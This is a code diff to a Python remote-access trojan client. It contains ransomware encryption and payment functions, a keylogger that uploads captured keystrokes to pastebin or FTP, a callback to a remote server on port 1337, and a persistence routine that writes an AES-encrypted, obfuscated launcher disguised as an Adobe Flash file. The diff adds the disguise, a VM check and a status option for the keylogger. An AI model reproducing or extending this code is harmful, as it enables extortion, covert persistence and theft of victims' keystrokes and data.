@@ -579,9 +579,7 @@ class Client(object):
             else:
                 return "{} does not yet support {} platform".format(Client._ransom_payment.func_name, sys.platform)
         except Exception as e:
-            e = "{} error: {}".format(Client._ransom_payment.func_name, str(e))
-            Client.debug(e)
-            return e
+            Client.debug("{} error: {}".format(Client._ransom_payment.func_name, str(e)))
 
                 
     def _ransom_encrypt(self, path):
@@ -881,22 +879,24 @@ class Client(object):
 
 
     @config(platforms=['win32','linux2','darwin'])
-    def _persistence_add_encrypted_launcher(self):        
+    def _persistence_add_encrypted_launcher(self, start=81126388790932157784):        
         try:
             if hasattr(self, '__l__'):
+                if not start or not str(start).isdigit():
+                    return "Error: invalid start key - '{}'".format(start)
                 output      = []
-                data        = self._get_user_config(self.__l__).splitlines()
+                data        = self._get_user_config(self.__l__) + "\n\n" + "if __name__ == '__main__':\n\theader, body, footer = main(checkvm=True, config=%d)\n\tbody = body.replace('from __future__ import print_function','')\n\tcode = '\n\n\n'.join([header, body, footer])\n\texec(code)" % int(init)
                 b64var      = self._get_random_var(6)
                 aesvar      = self._get_random_var(6)
                 key         = self._get_random_var(32)
                 iv          = self._get_random_var(16)
-                output_file = "launcher_%s.py" % (self._get_random_var(3))
+                output_file = "AdobeFlash_27.1.{}.py".format(random.randint(1,175))
                 imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar] 
-                _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data]
+                _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data.splitlines()]
                 cipher      = AES.new(key, AES.MODE_CBC, iv)
                 ciphertext  = base64.b64encode(cipher.encrypt(self._get_padded('\n'.join(output), AES.block_size, '{')))
                 with file(output_file, 'w') as fp:
-                    fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip('{'))" % (aesvar, key, b64var, ciphertext))))
+                    fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip(\"{\"))" % (aesvar, key, b64var, ciphertext))))
                 return (True, output_file)
         except Exception as e:
             return (False, '{} error: {}'.format(self._persistence_add_encrypted_launcher.func_name, str(e)))
@@ -1420,7 +1420,7 @@ class Client(object):
  
     def _server_connect(self, port=1337):
         try:
-            host = self._get_remote_server()
+            host = self._get_remote_server() if not Client._debug else '127.0.0.1'
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5.0)
             s.connect((host, port))
@@ -2045,7 +2045,6 @@ class Client(object):
             return self._ransom_payment(self._session['id'])
             
         elif 'decrypt' in cmd:
-            print(action)
             rsa_key  = RSA.importKey(action)
             for key, value in self._results.items():
                 if 'ransom' in value.get('command') and 'encrypt' in value.get('command') and len(value.get('result')) > 50:
@@ -2171,21 +2170,21 @@ class Client(object):
         """
         start/stop/dump the keylogger
         """
-        if not mode:
+        if not mode:                                                                                                                                                                                                                                                                                             
             if self.keylogger.func_name not in self._jobs:
                 return self.keylogger.usage
             else:
-                return self._get_job_status(self._jobs[self.keylogger.func_name].name)
+                return self._keylogger_status()
         else:
             if 'start' in mode:
                 if self.keylogger.func_name not in self._jobs:
                     self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                     self._jobs[self.keylogger.func_name].setDaemon(True)
                     self._jobs[self.keylogger.func_name].start()
-                    self.keylogger.mode = mode
+                    self.keylogger.mode = 'running'
                     return self._keylogger_status()
                 else:
-                    self.keylogger.mode = mode
+                    self.keylogger.mode = 'running'
                     return self._keylogger_status()
             elif 'stop' in mode:
                 try:
@@ -2194,18 +2193,20 @@ class Client(object):
                 try:
                     self.stop(self._keylogger_manager.func_name)
                 except: pass
-                self.keylogger.mode = mode
+                self.keylogger.mode = 'stopped'
                 return self._keylogger_status()
             elif 'auto' in mode:
                 self._jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
                 self._jobs[self._keylogger_manager.func_name].setDaemon(True)
                 self._jobs[self._keylogger_manager.func_name].start()
-                self.keylogger.mode = mode
+                self.keylogger.mode = 'running'
                 return self._keylogger_status()
             elif 'dump' in mode:
                 result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in mode else self._upload_ftp(self.keylogger.buffer)
                 self.keylogger.buffer.reset()
                 return result
+            elif 'status' in mode:
+                return self._keylogger_status()
             else:
                 return self.keylogger.usage
 
